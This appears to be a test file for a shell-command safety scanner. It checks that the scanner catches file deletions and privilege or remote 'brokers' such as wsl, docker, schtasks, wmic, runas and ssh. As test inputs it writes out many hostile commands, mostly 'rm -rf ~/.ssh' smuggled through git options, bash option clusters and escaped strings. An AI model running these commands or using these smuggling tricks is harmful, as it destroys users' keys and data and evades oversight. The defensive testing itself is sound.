      // 19b, C19-6: every letter of the cluster classes, and the glued form after a cluster.
      ...['f', 'k', 'm', 'n', 'q', 'r', 'v'].map(l => `git rebase -${l}x "rm -rf ~/.ssh" HEAD~1`),
      'git difftool -gx "rm -rf ~/.ssh"', 'git difftool -dx "rm -rf ~/.ssh"', 'git rebase -rx"rm -rf ~/.ssh" HEAD~1']) {
      expect(pathsOf(scan(c), 'delete'), c).toContain('C:\\Users\\u\\.ssh')
    }
    const argv = (words: string[]) => scanArgv(words, BASE, W, { platform: 'win32' })
    expect(pathsOf(argv(['git', 'rebase', '--exe', 'rm -rf ~/.ssh', 'HEAD~1']), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(pathsOf(argv(['git', 'rebase', '-xrm -rf ~/.ssh', 'HEAD~1']), 'delete')).toContain('C:\\Users\\u\\.ssh')
    // rebase's other options keep their meaning: --empty, --edit-todo, -X<option>, -i.
    for (const c of ['git rebase --continue', 'git rebase -i HEAD~2', 'git rebase --empty=drop main', 'git rebase -Xours main', 'git rebase --edit-todo']) {
      const s = scan(c)
      expect(pathsOf(s, 'delete'), c).toEqual([])
      expect(s.selfBuilding, c).toBeNull()
      expect(s.faults, c).toEqual([])
    }
  })
  // 19b, C19-5: the other commands git runs, measured on git 2.53 (phase3\w19\scratch\c\out-b\gitprobe-b.out):
  // `bisect run <cmd> [<arg>...]` runs the command through the shell; send-email runs its `--to-cmd`, `--cc-cmd`,
  // `--header-cmd` and `--sendmail-cmd` (exact names: `--to-c` is "unrecognized argument"; `--to-cmd="echo ..."` ran);
  // instaweb starts its `--httpd` and `--browser` (`-d`, `-b`, any prefix down to `--h` and `--b`, a cluster `-ld`).
  it('C19-5: bisect run, send-email\'s command options and instaweb\'s httpd and browser are the commands git runs (19b)', () => {
    for (const c of ['git bisect run rm -rf ~/.ssh', 'git bisect run bash -c "rm -rf ~/.ssh"',
      'git send-email --to-cmd="rm -rf ~/.ssh" x.patch', 'git send-email --cc-cmd "rm -rf ~/.ssh" x.patch',
      'git send-email --header-cmd="rm -rf ~/.ssh" x.patch', 'git send-email --sendmail-cmd "rm -rf ~/.ssh" x.patch',
      'git instaweb --httpd="rm -rf ~/.ssh" --start', 'git instaweb --h "rm -rf ~/.ssh" --start', 'git instaweb -d "rm -rf ~/.ssh"',
      'git instaweb -ld "rm -rf ~/.ssh"', 'git instaweb --browser "rm -rf ~/.ssh"', 'git instaweb --br="rm -rf ~/.ssh"',
      'git instaweb -b"rm -rf ~/.ssh"']) {
      expect(pathsOf(scan(c), 'delete'), c).toContain('C:\\Users\\u\\.ssh')
    }
    for (const c of ['git bisect start HEAD HEAD~3', 'git bisect good', 'git bisect reset', 'git instaweb --stop', 'git instaweb -l --start',
      'git send-email --dry-run --to=a@b.c x.patch',
      // 19c, C19b-5: an SMTP server given by its name is read as the program word it is to the scan, and names nothing.
      'git send-email --smtp-server smtp.example.com --dry-run x.patch', 'git send-email --smtp-server=smtp.example.com x.patch']) {
      const s = scan(c)
      expect(pathsOf(s, 'delete'), c).toEqual([])
      expect(s.selfBuilding, c).toBeNull()
      expect(s.faults, c).toEqual([])
    }
  })
  // C3: bash's locale string `$"..."` is the double-quoted string when there is no message catalog.
  it('C3: a POSIX $"..." string is read as the double-quoted string it is', () => {
    expect(pathsOf(scan('rm -rf $"../.ssh"', X, XBASE), 'delete')).toContain('/work/.ssh')
    expect(pathsOf(scan('rm -rf $"$HOME/.ssh"', X, XBASE), 'delete')).toContain('/home/u/.ssh')
    expect(pathsOf(scan("bash -c 'rm -rf $\"$HOME/.ssh\"'"), 'delete')).toContain('C:\\Users\\u\\.ssh')
    const honest = scan('echo $"hello" > out.txt', X, XBASE)
    expect(pathsOf(honest, 'write')).toEqual(['/work/proj/out.txt'])
    expect(honest.faults).toEqual([])
    // Inside single or double quotes `$"` is text.
    expect(pathsOf(scan("echo '$\"../.ssh\"' > out.txt", X, XBASE), 'delete')).toEqual([])
  })
  // C4: bash takes one value for EACH o or O letter of a cluster.
  it('C4: a cluster with two o or O letters takes two values before the -c payload', () => {
    for (const c of ["bash -ooc pipefail errexit 'rm -rf ~/.ssh'", "bash -oOc pipefail extglob 'rm -rf ~/.ssh'", "bash +oo pipefail errexit -c 'rm -rf ~/.ssh'"]) {
      expect(pathsOf(scan(c), 'delete'), c).toContain('C:\\Users\\u\\.ssh')
      expect(pathsOf(scan(c, X, XBASE), 'delete'), c).toContain('/home/u/.ssh')
    }
    expect(pathsOf(scan("bash -o pipefail -o errexit -c 'make test'", X, XBASE), 'delete')).toEqual([])
    expect(pathsOf(scan("bash -oo pipefail errexit -c 'rm -rf build'", X, XBASE), 'delete')).toEqual(['/work/proj/build'])
  })
  // C5: the words brace lists make count across the whole text, so a text made of many lists cannot keep the event
  // loop busy before the budget is ever checked (measured before: 360 ms for 120 KiB of such words).
  it('C5: brace lists that make more than 4096 words across the command are a fault, and so is a word that makes more than 128 KiB', () => {
    const eight = 'w{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}'
    const words = (n: number) => Array.from({ length: n }, () => eight).join(' ')
    expect(scan(`touch ${words(16)}`, X, XBASE).faults).toEqual([])
    expect(scan(`touch ${words(17)}`, X, XBASE).faults.join()).toMatch(/brace lists that make more than 4096 words, or more than 128 KiB of text, across the command/)
    // The worst shape of the measurement: about 120 KiB of such words. Before, it was expanded whole and then refused
    // as too long; now the expansion stops at the cap.
    const big = scan(`touch ${words(3000)}`, X, XBASE)
    expect(big.faults.join()).toMatch(/brace lists that make more than 4096 words/)
    const tail = scan(`touch x{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}${'y'.repeat(120 * 1024)}`, X, XBASE)
    expect(tail.faults.join()).toMatch(/brace lists that make more than 4096 words, or more than 128 KiB of text/)
  })
  // C6: the scan's own sentinel characters never come from the input: raw text holding one is unreadable, and a
  // `$'...'` string that decodes to one (ITEM_DIR, \x0e, included) is read with a stand-in.
  it('C6: input holding one of the scan\'s own control characters is unreadable', () => {
    for (const ch of ['\u0001', '\u0002', '\u0003', '\u0004', '\u0005', '\u0006', '\u0007', '\u0008', '\u000e']) {
      expect(scan(`Remove-Item x${ch}y`).faults.join(), JSON.stringify(ch)).toMatch(/a control character the check uses itself/)
      expect(scan(`rm -rf x${ch}y`, X, XBASE).faults.join(), JSON.stringify(ch)).toMatch(/a control character the check uses itself/)
      expect(scanArgv(['git', 'add', `x${ch}y`], BASE, W, { platform: 'win32' }).faults.join(), JSON.stringify(ch)).toMatch(/a control character the check uses itself/)
    }
    // A tab, a newline, a carriage return and an escape character are ordinary text.
    expect(scan('echo "a\tb\r\n" > out.txt; echo \u001b[31m > o2.txt').faults).toEqual([])
    // Decoded: the reading gets a stand-in, so no table entry is injected and the item's folder is not taken.
    expect(pathsOf(scan("rm -rf $'\\x02'0$'\\x03'", X, XBASE), 'delete').every(p => p.startsWith('/work/proj'))).toBe(true)
    // (Before wave 19 the decoded \x0e reached a path the reader named: `/work/proj/{}\x0e/x`.)
    for (const c of ["find build -exec rm -rf {}$'\\x0e'/x \\;", "find build -exec rm -rf {}$'\\016'/x \\;"]) {
      expect(pathsOf(scan(c, X, XBASE), 'delete').filter(p => /[\u0001-\u0008\u000e]/.test(p)), c).toEqual([])
    }
  })
  // C9 (a): the round-c assertion on an echo held whatever the decoder did; this one reads a delete.
  it('C9: a $\'...\' string inside double quotes is text, so its escapes are not decoded there', () => {
    expect(pathsOf(scan("rm -rf \"$'\\x2e\\x2e'/.ssh\"", X, XBASE), 'delete')).not.toContain('/work/.ssh')
  })
  // C9 (c): the braced spelling of the status read is pinned too.
  it('C9: nativeTailStart is null for a last statement that reads ${LASTEXITCODE}', () => {
    expect(nativeTailStart('python a.py; python r.py ${LASTEXITCODE}')).toBeNull()
    expect(nativeTailStart('python a.py; python r.py ${global:LASTEXITCODE}')).toBeNull()
    expect(nativeTailStart('python a.py; python r.py ${?}')).toBeNull()
  })
  // C8: the class of honest work the unread-program rule refuses, named in its own words with the rewrite.
  it('C8: an unquoted $VAR/... program is refused with the quoted rewrite named', () => {
    for (const c of ['$VIRTUAL_ENV/bin/python -m pytest', '$JAVA_HOME/bin/java -jar x.jar']) {
      const s = scan(c, X, XBASE)
      expect(s.selfBuilding, c).toMatch(/a program named by an expansion the check cannot read/)
    }
    expect(scan('"$VIRTUAL_ENV/bin/python" -m pytest', X, XBASE).selfBuilding).toBeNull()
    expect(scan('"$JAVA_HOME/bin/java" -jar x.jar', X, XBASE).selfBuilding).toBeNull()
  })
  // From the box core builder: the box points OneDrive, OneDriveConsumer and OneDriveCommercial at the sandbox's
  // home. The reader keeps the REAL profile's OneDrive for them, as it keeps the real home for $HOME and
  // $env:USERPROFILE, which the same box points at the sandbox (integration directive 10): the check does not stand
  // down on the other layer's word.
  it('the OneDrive spellings name the real profile\'s OneDrive, as the home spellings name the real home', () => {
    for (const sp of ['$env:OneDrive', '$env:OneDriveConsumer', '$env:OneDriveCommercial', '%OneDrive%']) {
      expect(pathsOf(scan(`Remove-Item -Recurse ${sp}\\x`), 'delete'), sp).toEqual(['C:\\Users\\u\\OneDrive\\x'])
    }
  })
})

// Wave 19c, the brokers rule (decision sheet item 12, plan step P3 item (1)): a program that hands its work to a
// service which runs it at the service's own level is reported where the program word stands (`ShellScan.broker`),
// in any dialect and through any wrapper the scan reads; the word in a string, a comment or an operand is not one.
// The scan only reports it: the paths it reads are the same as without it.
describe('wave 19c: brokers', () => {
  const BROKER_FORMS = [
    'wsl ls -la', 'wsl.exe -e true', 'wsl --list --verbose', 'C:\\Windows\\System32\\wsl.exe -d Ubuntu', 'wslconfig /list',
    'C:\\Windows\\System32\\bash.exe -c "echo ok"', '& "$env:windir\\System32\\bash.exe" -c "ls"', 'cmd /c %windir%\\Sysnative\\bash.exe -c ls',
    'docker ps', 'docker.exe run --rm -v C:\\:/host alpine rm -rf /host/x', 'docker compose up -d', 'docker-compose up', 'podman run alpine true',
    'schtasks /create /tn x /tr calc.exe /sc once /st 00:00', 'schtasks /run /tn x', 'schtasks /change /tn x /disable', 'schtasks',
    'wmic process call create "cmd /c calc"', 'WMIC /node:localhost PROCESS CALL CREATE notepad',
    "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}",
    "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc'", "iwmi -Class Win32_Process -Name Create -ArgumentList calc",
    'runas /user:Administrator cmd', 'runas.exe /trustlevel:0x20000 notepad',
    'ssh user@host "rm -rf ~"', 'ssh -i key host', 'sftp host', 'scp x.txt user@host:/tmp/x', 'scp host:/etc/passwd .\\out\\p',
    'Start-Process notepad -Verb RunAs', 'Start-Process -Verb:runas cmd', "saps pwsh -Verb 'RunAs'", 'Start-Process cmd -V RunAs',
    // Through the wrappers and shells the scan reads.
    'cmd /c docker ps', 'powershell -Command "wsl ls"', 'Start-Process docker -ArgumentList ps', "bash -c 'ssh host true'",
    'Get-ChildItem; docker ps', 'python -c "import os; os.system(\'docker ps\')"',
  ]
  it('reports each broker form where its program word stands (19c)', () => {
    expect(BROKER_FORMS.filter(c => typeof scan(c).broker !== 'string')).toEqual([])
  })
  const NOT_BROKERS = [
    'schtasks /query /tn CynCo', 'schtasks /QUERY /fo list', 'schtasks -query',
    'Get-Content docker-compose.yml', 'cat docker-compose.yml', 'python tools/check.py docker-compose.yml', 'code .\\Dockerfile',
    'git push https://github.com/x/y.git main', 'git clone https://github.com/x/y.git', 'git fetch origin',
    'Write-Output "run wsl or docker later"', "echo 'ssh host'", '# docker ps', 'Get-ChildItem # wsl ls', 'Select-String -Pattern docker -Path .\\notes.md',
    'Get-CimInstance Win32_Process | Select-Object Name', 'wmic process list brief', 'bash -c "make test"', 'C:\\Program Files\\Git\\bin\\bash.exe -c ls',
    'scp build/x.txt build/y.txt', 'scp x.txt C:\\other\\x', 'Start-Process notepad -Verb Open', 'Start-Process python -ArgumentList tools/a.py',
    'ssh-keygen -l -f key.pub', 'npm run docker:build',
  ]
  it('leaves the honest forms unreported (19c)', () => {
    expect(NOT_BROKERS.filter(c => scan(c).broker !== null).map(c => `${c} -> ${scan(c).broker}`)).toEqual([])
    // Null, not absent: every scan says whether it saw one.
    expect(scan('git status').broker).toBeNull()
  })
  it('reads the same paths with the broker reading as without it (19c)', () => {
    // A broker's own words are still read: the delete inside the WSL payload and the read of the key.
    expect(pathsOf(scan('wsl rm -rf ~/.ssh'), 'delete')).toContain('C:\\Users\\u\\.ssh')
    expect(scan('wsl rm -rf ~/.ssh').broker).toEqual(expect.any(String))
    expect(scan('ssh -i ~/.ssh/id_ed25519 host').broker).toEqual(expect.any(String))
  })
})
